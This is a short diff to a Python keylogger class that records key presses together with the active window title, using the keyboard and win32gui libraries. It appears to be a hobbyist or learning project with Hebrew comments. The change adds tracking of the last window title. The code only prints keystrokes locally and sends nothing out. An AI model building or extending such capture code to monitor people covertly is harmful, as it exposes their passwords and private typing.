@@ -3,7 +3,6 @@ from typing import List
 import keyboard
 import win32gui
 
-
 class IKeyLogger(ABC):
      @abstractmethod
      def start_logging(self) -> None:
@@ -22,6 +21,7 @@ class mein_keylogg(IKeyLogger):
     def __init__(self):
         self.listener = None
         self.logged_keys = []
+        self.lest_windo_tytel = ""
 
     def get_active_window_title(self):
         window = win32gui.GetForegroundWindow()
@@ -31,7 +31,10 @@ class mein_keylogg(IKeyLogger):
     def add_key_and_window(self,event):
         if event.event_type == keyboard.KEY_DOWN:                     # רק כשמקש נלחץ הפעל את הפונקצייה לקליטת מקור ההקששה
             window_title = self.get_active_window_title()
+            if window_title != self.lest_windo_tytel:
+                self.lest_windo_tytel = window_title
             print(f"מקש: {event.name}, חלון פעיל: '{window_title}'")
+
 
     def stop_logging(self):
         keyboard.unhook(self.listener)
